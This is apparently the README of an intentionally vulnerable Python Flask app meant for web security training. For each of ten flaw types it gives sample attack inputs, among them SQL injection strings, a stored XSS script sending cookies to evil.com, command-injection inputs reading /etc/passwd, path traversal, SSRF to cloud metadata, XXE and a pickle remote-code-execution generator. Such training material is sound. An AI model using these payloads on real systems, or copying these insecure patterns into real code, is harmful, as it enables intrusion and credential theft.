# DVPWA - Damn Vulnerable Python Web App

A deliberately insecure web application built with Flask, designed for learning about web security vulnerabilities in a safe, controlled environment.

**Disclaimer:** vibecode involved

```text
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║   WARNING: INTENTIONALLY VULNERABLE APPLICATION                               ║
║                                                                               ║
║   DO NOT deploy to production or expose to the internet.                      ║
║   Use only for educational purposes in isolated environments.                 ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
```

## Quick Start

### Prerequisites

- Python 3.8+
- pip

### Installation

```bash
# Clone or navigate to the project
cd tmp-py

# Create a virtual environment (recommended)
python -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate

# Install dependencies
pip install -r requirements.txt

# Run the application
python app.py
```

The application will start at <http://localhost:5000>

## Default Credentials

| Username | Password   | Role  |
|----------|------------|-------|
| admin    | admin123   | Admin |
| user     | password   | User  |
| guest    | guest      | Guest |

## Vulnerabilities Included

### 1. SQL Injection (SQLi)

**Endpoints:** `/login`, `/register`, `/search`, `/post/new`

The login form uses string concatenation for SQL queries:

```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

**Try:**

- Username: `admin' OR '1'='1' --`
- Password: `anything`

### 2. Cross-Site Scripting (XSS)

#### Reflected XSS

**Endpoint:** `/search`

Search queries are reflected back without sanitization.

**Try:**

```html
<script>alert('XSS')</script>
```

#### Stored XSS

**Endpoint:** `/post/new`

Posts are stored and rendered without escaping.

**Try posting:**

```html
<script>document.location='http://evil.com?c='+document.cookie</script>
```

### 3. Command Injection

**Endpoint:** `/cmd`

The ping tool executes system commands with user input.

**Try:**

```bash
127.0.0.1; cat /etc/passwd
127.0.0.1 && ls -la
127.0.0.1 | whoami
```

### 4. Insecure Direct Object Reference (IDOR)

**Endpoint:** `/profile/<id>`

Any logged-in user can access any user's profile by changing the ID.

**Try:**

- `/profile/1` - Admin's profile
- `/profile/2` - User's profile
- `/profile/3` - Guest's profile

### 5. Broken Access Control

**Endpoint:** `/admin`

The admin panel only checks if a user is logged in, not their role.

**Try:** Login as `guest/guest` and navigate to `/admin`

### 6. Path Traversal / Local File Inclusion (LFI)

**Endpoints:** `/file`, `/download`

File operations don't validate paths.

**Try:**

```bash
readme.txt
../app.py
../../etc/passwd
../../../etc/shadow
```

### 7. Server-Side Request Forgery (SSRF)

**Endpoint:** `/api/fetch?url=`

The server fetches arbitrary URLs without validation.

**Try:**

```bash
file:///etc/passwd
http://localhost:5000/api/user
http://169.254.169.254/latest/meta-data/  # AWS metadata
```

### 8. Insecure Deserialization

**Endpoint:** `/api/deserialize` (POST)

Accepts base64-encoded pickle data without validation.

**Generate malicious payload:**

```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload.decode())
```

### 9. XML External Entity (XXE)

**Endpoint:** `/api/xml` (POST)

Parses XML without disabling external entities.

**Try:**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
```

### 10. Sensitive Data Exposure

#### Hardcoded Secrets

```python
app.secret_key = "super_secret_key_12345"
```

#### Plaintext Passwords

Passwords are stored in the database without hashing.

#### Exposed Endpoints

- `/api/user` - Returns all users with passwords and API keys
- `/debug` - Exposes configuration, secrets, and environment variables
- `/backup` - Downloads the entire SQLite database

## Project Structure

```text
tmp-py/
├── app.py                 # Main Flask application
├── requirements.txt       # Python dependencies
├── Makefile              # Build automation
├── vulnerable.db         # SQLite database (created on first run)
├── uploads/              # File upload directory
│   └── readme.txt        # Sample file
├── templates/
│   ├── base.html         # Base template with styling
│   ├── index.html        # Homepage with vulnerability list
│   ├── login.html        # Login form (SQLi)
│   ├── register.html     # Registration form (SQLi)
│   ├── dashboard.html    # User dashboard (Stored XSS)
│   ├── search.html       # Search page (Reflected XSS + SQLi)
│   ├── new_post.html     # Create post (Stored XSS)
│   ├── profile.html      # User profile (IDOR)
│   ├── admin.html        # Admin panel (Broken Access Control)
│   ├── cmd.html          # Ping tool (Command Injection)
│   ├── file.html         # File viewer (Path Traversal)
│   ├── fetch.html        # URL fetcher (SSRF)
│   ├── xml.html          # XML parser (XXE)
│   └── deserialize.html  # Pickle deserializer (Insecure Deserialization)
└── README.md
```

## Makefile Commands

| Command        | Description                              |
|----------------|------------------------------------------|
| `make help`    | Show all available commands              |
| `make install` | Create venv and install dependencies     |
| `make run`     | Run the application                      |
| `make dev`     | Run in development mode with auto-reload |
| `make reset`   | Reset database and uploads               |
| `make clean`   | Remove venv and generated files          |
| `make test`    | Run vulnerability tests                  |

## Security Learning Resources

After exploring these vulnerabilities, learn how to fix them:

- **SQL Injection:** Use parameterized queries / prepared statements
- **XSS:** Escape output, use Content-Security-Policy headers
- **Command Injection:** Avoid shell=True, use subprocess with lists
- **IDOR:** Implement proper authorization checks
- **Access Control:** Verify roles/permissions on every request
- **Path Traversal:** Validate and sanitize file paths
- **SSRF:** Whitelist allowed URLs/domains
- **Deserialization:** Never deserialize untrusted data
- **XXE:** Disable external entity processing
- **Data Exposure:** Hash passwords, use environment variables for secrets

---
